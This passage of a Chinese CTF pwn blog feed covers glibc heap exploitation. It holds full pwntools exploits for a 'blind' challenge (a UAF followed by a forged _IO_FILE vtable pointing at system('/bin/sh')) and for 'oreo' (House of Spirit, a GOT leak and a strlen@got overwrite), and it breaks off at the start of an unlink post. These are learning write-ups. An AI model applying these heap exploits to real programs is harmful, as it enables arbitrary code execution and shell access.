&lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_write_end = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_buf_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\n&quot;, </span><br><span class="line">    _IO_buf_end = 0x7ffff7dd26a4 &lt;_IO_2_1_stdout_+132&gt; &quot;&quot;, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;, </span><br><span class="line">    _fileno = 1, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = -1, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &apos;\000&apos;, </span><br><span class="line">    _shortbuf = &quot;\n&quot;, </span><br><span class="line">    _lock = 0x7ffff7dd3780 &lt;_IO_stdfile_1_lock&gt;, </span><br><span class="line">    _offset = -1, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x7ffff7dd17a0 &lt;_IO_wide_data_1&gt;, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = -1, </span><br><span class="line">    _unused2 = &apos;\000&apos; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;      &lt;---------将要被修改指向system(&apos;/bin/sh&apos;)函数的虚表指针</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个确实是知识点不足，对_IO_FILE比较陌生。</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh = process(&apos;./blind&apos;)</span><br><span class="line">elf = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">def new(idx,content):</span><br><span class="line">    sh.sendline(&apos;1&apos;)</span><br><span class="line">    sh.recvuntil(&apos;Index:&apos;)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(&apos;Content:&apos;)</span><br><span class="line">    sh.send(content)</span><br><span class="line">    sh.recvuntil(&apos;Choice:&apos;)</span><br><span class="line"></span><br><span class="line">def change(idx,content):</span><br><span class="line">    sh.sendline(&apos;2&apos;)</span><br><span class="line">    sh.recvuntil(&apos;Index:&apos;)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(&apos;Content:&apos;)</span><br><span class="line">    sh.send(content)</span><br><span class="line">    sh.recv()</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    sh.sendline(&apos;3&apos;)</span><br><span class="line">    sh.recvuntil(&apos;Index:&apos;)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(&apos;Choice:&apos;)</span><br><span class="line"></span><br><span class="line">system_addr =  0x4008E3</span><br><span class="line"></span><br><span class="line">new(0,&apos;a\n&apos;)</span><br><span class="line">new(1,&apos;b\n&apos;)</span><br><span class="line">delete(0)</span><br><span class="line">change(0,p64(0x60203d)+&apos;\n&apos;)     &lt;-------直接利用UAF漏洞伪造fastbin，相对于释放两个再伪造方便了不少</span><br><span class="line"></span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">payload = &apos;a&apos;*0x13 + p64(0x602020)+p64(0x602090)+ p64(0x602090+0x68)+ p64(0x602090+0x68*2) + p64(0x602090+0x68*3)+&apos;\n&apos;</span><br><span class="line">new(2,&apos;a\n&apos;)</span><br><span class="line">new(3,payload)     &lt;-------------伪造的chunk 再用来修改存储chunk指针的地方，后面malloc的事直接省了，还不用考虑过malloc(fastbin)的检查</span><br><span class="line"></span><br><span class="line">gdb.attach(sh)</span><br><span class="line">fake_struct = p64(0x00000000fbad8000) + p64(0x602060)*7 + p64(0x602061) + p64(0)*4  </span><br><span class="line">fake_struct +=  p64(0x602060) + p64(0x1)  + p64(0xffffffffffffffff) + p64(0)</span><br><span class="line">fake_struct += p64(0x602060) + p64(0xffffffffffffffff) + p64(0) + p64(0x602060) </span><br><span class="line">fake_struct +=  p64(0)*3 + p64(0x00000000ffffffff) + p64(0)*2 +  p64(0x602090 + 0x68*3)</span><br><span class="line">fake_vtable = p64(system_addr)*10</span><br><span class="line"></span><br><span class="line">change(1,fake_struct[:0x68])</span><br><span class="line">change(2,fake_struct[0x68:0xd0])</span><br><span class="line">change(3,fake_struct[0xd0:]+&apos;\n&apos;)</span><br><span class="line">change(4,fake_vtable+&apos;\n&apos;)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x/100gx 0x602020</span><br><span class="line">0x602020 &lt;stdout&gt;:0x00007f8bb5dde6200x0000000000000000  </span><br><span class="line">0x602030 &lt;stdin&gt;:0x00007f8bb5ddd8e00x0000000000000000</span><br><span class="line">0x602040 &lt;stderr&gt;:0x00007f8bb5dde5400x6161610000000000</span><br><span class="line">0x602050:0x61616161616161610x6161616161616161</span><br><span class="line">0x602060:0x00000000006020200x0000000000602090</span><br><span class="line">0x602070:0x00000000006020f80x0000000000602160      &lt;-----伪造的一堆chunk指针</span><br><span class="line">0x602080:0x00000000006021c80x0000000000000000</span><br><span class="line"></span><br><span class="line">0x602090:0x00000000fbad80000x0000000000602060      &lt;-----fake_struct 开始</span><br><span class="line">0x6020a0:0x00000000006020600x0000000000602060</span><br><span class="line">0x6020b0:0x00000000006020600x0000000000602060</span><br><span class="line">0x6020c0:0x00000000006020600x0000000000602060</span><br><span class="line">0x6020d0:0x00000000006020610x0000000000000000</span><br><span class="line">0x6020e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6020f0:0x00000000000000000x0000000000602060</span><br><span class="line">0x602100:0x00000000000000010xffffffffffffffff</span><br><span class="line">0x602110:0x00000000000000000x0000000000602060</span><br><span class="line">0x602120:0xffffffffffffffff0x0000000000000000</span><br><span class="line">0x602130:0x00000000006020600x0000000000000000</span><br><span class="line">0x602140:0x00000000000000000x0000000000000000</span><br><span class="line">0x602150:0x00000000ffffffff0x0000000000000000</span><br><span class="line">0x602160:0x00000000000000000x00000000006021c8     &lt;----vtable指针指向存放system(&apos;/bin/sh&apos;)函数的地址</span><br><span class="line">0x602170:0x00000000000000000x0000000000000000</span><br><span class="line">0x602180:0x00000000000000000x0000000000000000</span><br><span class="line">0x602190:0x00000000000000000x0000000000000000</span><br><span class="line">0x6021a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x6021b0:0x00000000000000000x0000000000000000</span><br><span class="line"></span><br><span class="line">0x6021c0:0x00000000000000000x00000000004008e3      &lt;-----存放了一堆system(&apos;/bin/sh&apos;)函数的地址，便于命中</span><br><span class="line">0x6021d0:0x00000000004008e30x00000000004008e3</span><br><span class="line">0x6021e0:0x00000000004008e30x00000000004008e3</span><br><span class="line">0x6021f0:0x00000000004008e30x00000000004008e3</span><br><span class="line">0x602200:0x00000000004008e30x00000000004008e3</span><br><span class="line">0x602210:0x00000000004008e30x0000000000000000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">change(0,p64(0x602090)+&apos;\n&apos;)                          &lt;------修改stdout指针，稳了</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;第一次打比赛便被网鼎杯血虐，当时栈溢出的水平不足以达到唯一的一个栈溢出的题目的要求，堆就更不必多说了。&lt;/em&gt;&lt;br&gt;&lt;em&gt;现在在学习堆的中间回来看看有没有能力去复现当时的题。&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;GUESS&quot;&gt;&lt;a href=&quot;#GUESS&quot; c
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
      <category term="stack" scheme="http://siriuswhiter.tk/tags/stack/"/>
    
  </entry>
  
  <entry>
    <title>Introduction to pwn2.5-HouseOfSpirit</title>
    <link href="http://siriuswhiter.tk/2018/12/23/introduction-to-pwn2-5-houseofspirit/"/>
    <id>http://siriuswhiter.tk/2018/12/23/introduction-to-pwn2-5-houseofspirit/</id>
    <published>2018-12-23T12:50:03.000Z</published>
    <updated>2018-12-29T04:14:14.569Z</updated>
    
    <content type="html"><![CDATA[<h1 id="House-of-Spirit-原理"><a href="#House-of-Spirit-原理" class="headerlink" title="House of Spirit 原理"></a>House of Spirit 原理</h1><p>终于正式步入了houseof系列！！</p><p>house of spirit 其实也属于fastbin attack。简单来讲就是伪造一个chunk，不论这个chunk在什么位置，使之能够满足被free的条件，之后再将其malloc出来，因为malloc到了一个我们可控的区域，就有希望继续为所欲为。</p><p>依旧heap-explotation举例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">struct fast_chunk &#123;</span><br><span class="line">  size_t prev_size;</span><br><span class="line">  size_t size;</span><br><span class="line">  struct fast_chunk *fd;</span><br><span class="line">  struct fast_chunk *bk;</span><br><span class="line">  char buf[0x20];                   // chunk falls in fastbin size range</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct fast_chunk fake_chunks[2];   // Two chunks in consecutive memory</span><br><span class="line">// fake_chunks[0] at 0x7ffe220c5ca0</span><br><span class="line">// fake_chunks[1] at 0x7ffe220c5ce0</span><br><span class="line"></span><br><span class="line">void *ptr, *victim;</span><br><span class="line"></span><br><span class="line">ptr = malloc(0x30);                 // First malloc</span><br><span class="line"></span><br><span class="line">// Passes size check of &quot;free(): invalid size&quot;</span><br><span class="line">fake_chunks[0].size = sizeof(struct fast_chunk);  // 0x40</span><br><span class="line"></span><br><span class="line">// Passes &quot;free(): invalid next size (fast)&quot;</span><br><span class="line">fake_chunks[1].size = sizeof(struct fast_chunk);  // 0x40</span><br><span class="line"></span><br><span class="line">// Attacker overwrites a pointer that is about to be &apos;freed&apos;</span><br><span class="line">ptr = (void *)&amp;fake_chunks[0].fd;</span><br><span class="line"></span><br><span class="line">// fake_chunks[0] gets inserted into fastbin</span><br><span class="line">free(ptr);</span><br><span class="line"></span><br><span class="line">victim = malloc(0x30);              // 0x7ffe220c5cb0 address returned from malloc</span><br></pre></td></tr></table></figure><p>可以看见最后malloc到了fakechunk的位置，之后具体的利用以oreo举例</p><h1 id="oreo"><a href="#oreo" class="headerlink" title="oreo"></a>oreo</h1><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>1.malloc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">unsigned int add()</span><br><span class="line">&#123;</span><br><span class="line">  rifle *v1; // [esp+18h] [ebp-10h]</span><br><span class="line">  unsigned int v2; // [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(0x14u);</span><br><span class="line">  v1 = head;</span><br><span class="line">  head = (rifle *)malloc(0x38u);</span><br><span class="line">  if ( head )</span><br><span class="line">  &#123;</span><br><span class="line">    head-&gt;next = v1;</span><br><span class="line">    printf(&quot;Rifle name: &quot;);</span><br><span class="line">    fgets(head-&gt;name, 0x38, stdin);</span><br><span class="line">    cut_enter(head-&gt;name);</span><br><span class="line">    printf(&quot;Rifle description: &quot;);</span><br><span class="line">    fgets(head-&gt;descript, 0x38, stdin);</span><br><span class="line">    cut_enter(head-&gt;descript);</span><br><span class="line">    ++rifle_cnt;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Something terrible happened!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">分析得到的结构体, name及description存在明显的溢出。</span><br><span class="line"></span><br><span class="line">00000000 rifle           struc ; (sizeof=0x38, mappedto_5)</span><br><span class="line">00000000 descript        db 25 dup(?)</span><br><span class="line">00000019 name            db 27 dup(?)</span><br><span class="line">00000034 next            dd ?                    ; offset</span><br><span class="line">00000038 rifle           ends</span><br></pre></td></tr></table></figure></p><p>2.show</p><p>通过i-&gt;next遍历所有的malloc结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">unsigned int show_rifles()</span><br><span class="line">&#123;</span><br><span class="line">  rifle *i; // [esp+14h] [ebp-14h]</span><br><span class="line">  unsigned int v2; // [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Rifle to be ordered:\n%s\n&quot;, &quot;===================================&quot;);</span><br><span class="line">  for ( i = head; i; i = i-&gt;next )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Name: %s\n&quot;, i-&gt;name);</span><br><span class="line">    printf(&quot;Description: %s\n&quot;, i);</span><br><span class="line">    puts(&quot;===================================&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.message</p><p>给了一块0x80大小的可以写notice的内存，给了我们伪造bypass fakechunk检查的机会</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">unsigned int message()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v0; // ST1C_4</span><br><span class="line"></span><br><span class="line">  v0 = __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Enter any notice you&apos;d like to submit with your order: &quot;);</span><br><span class="line">  fgets(notice, 0x80, stdin);</span><br><span class="line">  cut_enter(notice);</span><br><span class="line">  return __readgsdword(0x14u) ^ v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>在上面的条件之下，我们便有了机会利用house of spirit 的机会，注意到bss段变量的存放顺序–&gt;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A288 head          </span><br><span class="line">.bss:0804A288                                         </span><br><span class="line">.bss:0804A28C                </span><br><span class="line">.bss:0804A2A0 order_num      </span><br><span class="line">.bss:0804A2A0                                        </span><br><span class="line">.bss:0804A2A4 rifle_cnt      </span><br><span class="line">.bss:0804A2A4                                        </span><br><span class="line">.bss:0804A2A8 ; char *notice</span><br><span class="line">.bss:0804A2A8 notice         </span><br><span class="line">.bss:0804A2A8</span><br></pre></td></tr></table></figure><p>而程序中仅有固定的malloc(0x38)，分配出来的chunk size应该为0x41,我们可以想到，当malloc足够的chunk时，rifle_cnt将可以达到0x40，为了绕过free fastbin的检查我们就需要在notice中伪造nextchunk的pre_size 及size，这个很容易以做到。<br>伪造完成后，因为add中存在对name的溢出，那么如果将其溢出至rifle-&gt;next的位置，填入任一函数的got地址，那么在show时便足以泄露实际地址然后得到system，/bin/sh的地址。之后便将其溢出为fakechunk处，为之后的free做好准备。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.terminal = [&apos;gnome-terminal&apos;, &apos;-x&apos;, &apos;sh&apos;, &apos;-c&apos;]</span><br><span class="line">if args[&apos;DEBUG&apos;]:</span><br><span class="line">    context.log_level = &apos;debug&apos;</span><br><span class="line">context.binary = &quot;./oreo&quot;</span><br><span class="line">oreo = ELF(&quot;./oreo&quot;)</span><br><span class="line">if args[&apos;REMOTE&apos;]:</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">else:</span><br><span class="line">    p = process(&quot;./oreo&quot;)</span><br><span class="line">log.info(&apos;PID: &apos; + str(proc.pidof(p)[0]))</span><br><span class="line">libc = ELF(&apos;./libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(descrip, name):</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    #p.recvuntil(&apos;Rifle name: &apos;)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    #p.recvuntil(&apos;Rifle description: &apos;)</span><br><span class="line">    #sleep(0.5)</span><br><span class="line">    p.sendline(descrip)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show_rifle():</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.recvuntil(&apos;===================================\n&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def order():</span><br><span class="line">    p.sendline(&apos;3&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def message(notice):</span><br><span class="line">    p.sendline(&apos;4&apos;)</span><br><span class="line">    #p.recvuntil(&quot;Enter any notice you&apos;d like to submit with your order: &quot;)</span><br><span class="line">    p.sendline(notice)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    print &apos;step 1. leak libc base&apos;</span><br><span class="line">    name = 27 * &apos;a&apos; + p32(oreo.got[&apos;puts&apos;])</span><br><span class="line">    add(25 * &apos;a&apos;, name)</span><br><span class="line">    show_rifle()</span><br><span class="line">    p.recvuntil(&apos;===================================\n&apos;)</span><br><span class="line">    p.recvuntil(&apos;Description: &apos;)</span><br><span class="line">    puts_addr = u32(p.recvuntil(&apos;\n&apos;, drop=True)[:4])</span><br><span class="line">    log.success(&apos;puts addr: &apos; + hex(puts_addr))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[&apos;puts&apos;]</span><br><span class="line">    system_addr = libc_base + libc.symbols[&apos;system&apos;]</span><br><span class="line">    binsh_addr = libc_base + next(libc.search(&apos;/bin/sh&apos;))</span><br><span class="line">    print &quot;binsh_addr: &quot; + hex(binsh_addr)</span><br><span class="line">    print &apos;step 2. free fake chunk at 0x0804A2A8&apos;</span><br><span class="line"></span><br><span class="line">    # now, oifle_cnt=1, we need set it = 0x40</span><br><span class="line">    oifle = 1</span><br><span class="line">    while oifle &lt; 0x3f:</span><br><span class="line">        # set next link=NULL</span><br><span class="line">        add(25 * &apos;a&apos;, &apos;a&apos; * 27 + p32(0))</span><br><span class="line">        oifle += 1</span><br><span class="line">    payload = &apos;a&apos; * 27 + p32(0x0804a2a8)</span><br><span class="line">    # set next link=0x0804A2A8, try to free a fake chunk</span><br><span class="line">    add(25 * &apos;a&apos;, payload)</span><br><span class="line">    # before free, we need to bypass some check</span><br><span class="line">    # fake chunk&apos;s size is 0x40</span><br><span class="line">    # 0x20 *&apos;a&apos; for padding the last fake chunk</span><br><span class="line">    # 0x40 for fake chunk&apos;s next chunk&apos;s prev_size</span><br><span class="line">    # 0x100 for fake chunk&apos;s next chunk&apos;s size</span><br><span class="line">    # set fake iofle&apos; next to be NULL</span><br><span class="line">    payload = 0x20 * &apos;\x00&apos; + p32(0x40) + p32(0x100)</span><br><span class="line">    payload = payload.ljust(52, &apos;b&apos;)</span><br><span class="line">    payload += p32(0)</span><br><span class="line">    payload = payload.ljust(128, &apos;c&apos;)</span><br><span class="line">    message(payload)</span><br><span class="line">    # fastbin 0x40: 0x0804A2A0-&gt;some where heap-&gt;NULL</span><br><span class="line">    order()</span><br><span class="line">    p.recvuntil(&apos;Okay order submitted!\n&apos;)</span><br><span class="line"></span><br><span class="line">    print &apos;step 3. get shell&apos;</span><br><span class="line">    # modify strlen@got to system addr                   // don&apos;t know why modified free@got addr could&apos;t get shell</span><br><span class="line">    payload = p32(oreo.got[&apos;strlen&apos;]).ljust(20, &apos;a&apos;)</span><br><span class="line">    add(payload, &apos;b&apos; * 20)</span><br><span class="line">    log.success(&apos;system addr: &apos; + hex(system_addr))</span><br><span class="line">    #gdb.attach(p)</span><br><span class="line">    message(p32(system_addr) + &apos;;/bin/sh\x00&apos;) </span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;House-of-Spirit-原理&quot;&gt;&lt;a href=&quot;#House-of-Spirit-原理&quot; class=&quot;headerlink&quot; title=&quot;House of Spirit 原理&quot;&gt;&lt;/a&gt;House of Spirit 原理&lt;/h1&gt;&lt;p&gt;终于正式步入
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>Introduction to pwn2.4-unlink</title>
    <link href="http://siriuswhiter.tk/2018/12/20/introduction-to-pwn2-4-unlink/"/>
    <id>http://siriuswhiter.tk/2018/12/20/introduction-to-pwn2-4-unlink/</id>
    <published>2018-12-20T02:34:50.000Z</published>
    <updated>2018-12-22T14:40:53.644Z</updated>
    
    <content type="html"><![CDATA[<p>之前看了好久的unlink，现在回来再看一下，顺便写个笔记</p><h1 id="unlink-原理"><a href="#unlink-原理" class="headerlink" title="unlink 原理"></a>unlink 原理</h1><p>  当创建几个满足smallbin大小的块时，如果有可能使数据溢出，那么在中间的一个chunk中可以伪造一个fakechunk，同时溢出至下一个chunk的头部，伪造pre_size为fakechunk的size，修改size处的标志位，使之认为前一个chunk为空。<br>  那么在free nextchunk(chunk2)时，因为unlink的机制，会先检查前一块chunk1是否为空，如果通过检验，那么便会将其卸下，之后再检查nextnextchunk(chunk3)，发现正在使用，则执行unlink</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  </span><br><span class="line">FD=P-&gt;fd</span><br><span class="line">BK=P-&gt;bk </span><br><span class="line">FD-&gt;bk = BK</span><br><span class="line">BK-&gt;fd = FD</span><br></pre></td></tr></table></figure><p>  这样的操作在正常情况下会将空闲chunk卸下，但是在这样的伪造情况下，chunk1中的fakechunk便会进入chunklist。而在前面绕过unlink检查时，我们修改了fd与bk指针，使得P-&gt;FD-&gt;BK = P, P-&gt;BK-&gt;FD = P；为了能够得到对指针的控制，我们倾向于将其指向chunk1的指针所放置的内存之上，之后再修改chunk1的内容，实质上便是在修改自己的指针放置的位置及之后的指针，从而修改got表或者malloc_hook或free_hook之类的达到get_shell的目的。</p><p>使用heap-exploitation的例子来见证一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 